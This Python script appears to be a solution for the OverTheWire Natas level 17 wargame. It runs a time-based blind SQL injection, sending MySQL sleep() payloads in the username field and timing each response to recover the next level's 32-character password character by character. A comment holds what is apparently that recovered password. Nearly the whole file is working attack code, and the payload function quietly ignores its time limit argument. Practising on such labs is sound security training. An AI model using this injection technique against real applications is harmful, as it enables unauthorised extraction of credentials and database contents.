import string
import time

import requests

import natas16


def payload(s: str, time_limit: int) -> str:
    # From MySQL documentation:
    # IF(expr1,expr2,expr3)
    # If expr1 is TRUE (expr1 <> 0 and expr1 <> NULL), IF() returns expr2.
    # Otherwise, it returns expr3.
    template = (
        'natas18" AND '
        'IF(password LIKE BINARY "{s}%", sleep({time_limit}), NULL); -- '
    )
    return template.format(s=s, time_limit=2)


def solution(password: str = None, time_limit: int = 2) -> str:
    url = "http://natas17.natas.labs.overthewire.org"
    username = "natas17"
    if not password:
        password = natas16.solution()

    # This has the same source code as natas15 except the "echo"
    # lines that tell us whether or not a user exists are commented out.
    # We can use a time-based attack.

    choices = string.ascii_letters + string.digits
    PASSWORD_LENGTH = 32
    known = ""
    auth = (username, password)

    # Make a single pass through possible characters to reduce the
    # number of guesses.
    for choice in choices:
        data = {"username": payload("%" + choice, time_limit)}
        start = time.time()
        requests.post(url, auth=auth, data=data)
        end = time.time()
        if end - start > time_limit:
            known += choice
    natas18_password = ""
    while len(natas18_password) < PASSWORD_LENGTH:
        for choice in known:
            data = {"username": payload(natas18_password + choice, time_limit)}
            start = time.time()
            requests.post(url, auth=auth, data=data)
            end = time.time()
            if end - start > time_limit:
                natas18_password += choice
    # xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
    return natas18_password
